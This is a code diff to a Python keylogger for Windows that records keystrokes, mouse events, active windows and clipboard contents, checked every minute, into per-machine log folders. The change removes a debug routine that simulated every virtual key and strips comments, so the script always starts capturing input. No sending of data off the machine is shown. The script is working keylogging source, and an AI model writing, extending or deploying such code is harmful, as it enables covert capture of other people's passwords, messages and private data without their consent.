@@ -144,16 +144,15 @@ for i in range(VK_NUMPAD0, VK_NUMPAD9 + 1):
     VK_TO_NAME[i] = f"VK_NUMPAD{i - VK_NUMPAD0}"
    
 INTERVAL_MS = 20
-DEBUG = False
 
 PC_LOGGER_PATH = os.path.abspath(
     os.path.join(os.path.dirname(__file__), "..", "modules", "pc_logger.py")
 )
 
-# Load the module only if the file exists
+
 if not os.path.isfile(PC_LOGGER_PATH):
     print(f"[!] pc_logger.py not found at {PC_LOGGER_PATH}", file=sys.stderr)
-    # Fallback: use a generic folder next to the script
+    
     log_dir = os.path.join(os.path.dirname(__file__), "PCLogs")
     os.makedirs(log_dir, exist_ok=True)
     get_pc_log_folder = lambda create_if_missing=False: log_dir
@@ -161,12 +160,10 @@ else:
     spec = importlib.util.spec_from_file_location("pc_logger", PC_LOGGER_PATH)
     pc_logger = importlib.util.module_from_spec(spec)
     spec.loader.exec_module(pc_logger)
-    get_pc_log_folder = pc_logger.get_pc_log_folder   # <-- the function we need
-# ----------------------------------------------------------------------
-# 2. Determine the per-PC log folder (creates it if needed)
-# ----------------------------------------------------------------------
-log_dir = get_pc_log_folder(create_if_missing=True)   # <-- creates …/machine-ids/<PCNAME>/
-os.makedirs(log_dir, exist_ok=True)                  # safety net
+    get_pc_log_folder = pc_logger.get_pc_log_folder   
+
+log_dir = get_pc_log_folder(create_if_missing=True)   
+os.makedirs(log_dir, exist_ok=True)                  
 KEY_LOG_FILE = os.path.join(log_dir, "key_logs.log")
 MOUSE_LOG_FILE = os.path.join(log_dir, "mouse_logs.log")
 CLIPBOARD_LOG_FILE = os.path.join(log_dir, "clipboard.log")
@@ -225,60 +222,6 @@ def get_special_char(vk):
         return "[SCROLL LOCK ON]" if (GetKeyState(VK_SCROLL) & 1) else "[SCROLL LOCK OFF]"
     return specials.get(vk)
 
-def test_all_keys():
-    print("--- DEBUG MODE: Testing All Keys ---")
-    print("This will simulate pressing every virtual key (0x01-0xFF).")
-    print("This does NOT physically press keys on your keyboard.")
-
-    with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"\n\n--- DEBUG MODE TEST START: {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
-
-    modifier_states = {
-        "None":  {"Shift": False, "Ctrl": False, "Alt": False},
-        "Shift": {"Shift": True,  "Ctrl": False, "Alt": False},
-        "Ctrl":  {"Shift": False, "Ctrl": True,  "Alt": False},
-        "Alt":   {"Shift": False, "Ctrl": False, "Alt": True}
-    }
-
-    global last_key_state
-    last_key_state = bytearray(256)
-
-    for mod_name, mods in modifier_states.items():
-        print(f"\nTesting with modifiers: {mod_name}")
-        with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(f"\n[DEBUG] Testing with modifiers: {mod_name}\n")
-
-        mock_state = bytearray(256)
-        if mods["Shift"]:
-            mock_state[VK_SHIFT] = mock_state[VK_LSHIFT] = mock_state[VK_RSHIFT] = 0x80
-        if mods["Ctrl"]:
-            mock_state[VK_CONTROL] = mock_state[VK_LCONTROL] = mock_state[VK_RCONTROL] = 0x80
-        if mods["Alt"]:
-            mock_state[VK_MENU] = mock_state[VK_LMENU] = mock_state[VK_RMENU] = 0x80
-        mock_state[VK_CAPITAL] = 0x01
-
-        for vk in range(0x01, 0x100):
-            is_pressed = True
-            was_pressed = last_key_state[vk] != 0
-
-            if is_pressed and not was_pressed:
-                char = get_special_char(vk)
-                if not char and vk not in {VK_SHIFT, VK_CONTROL, VK_MENU, VK_LWIN, VK_RWIN, VK_APPS, VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_XBUTTON1, VK_XBUTTON2}:
-                    char = get_char_from_vk(vk, mock_state)
-                char_display = char if char else "[NO CHAR]"
-                key_name = VK_TO_NAME.get(vk, f"0x{vk:02X}")
-                log_entry = f"[DEBUG] {key_name} (VK: 0x{vk:02X}) - Detected: {char_display}"
-                with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
-                    f.write(log_entry + "\n")
-            last_key_state[vk] = 0x80 if is_pressed else 0
-
-        last_key_state = bytearray(256)
-
-    with open(KEY_LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"\n--- DEBUG MODE TEST END: {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
-    print("--- DEBUG MODE TEST COMPLETE ---")
-    sys.exit(0)
-
 def start_logger():
     global last_active_window, last_key_state, last_clipboard_check, last_clipboard_content
     print("Starting.. Press Ctrl+C to stop.")
@@ -291,7 +234,7 @@ def start_logger():
             time.sleep(INTERVAL_MS / 1000.0)
 
             current_time = time.time()
-            if current_time - last_clipboard_check >= 60:  # Every 1 minute
+            if current_time - last_clipboard_check >= 60:  
                 clipboard_content = get_clipboard_text()
                 if clipboard_content != last_clipboard_content and clipboard_content:
                     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -344,7 +287,4 @@ def start_logger():
         print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
-    if DEBUG:
-        test_all_keys()
-    else:
-        start_logger()
+    start_logger()
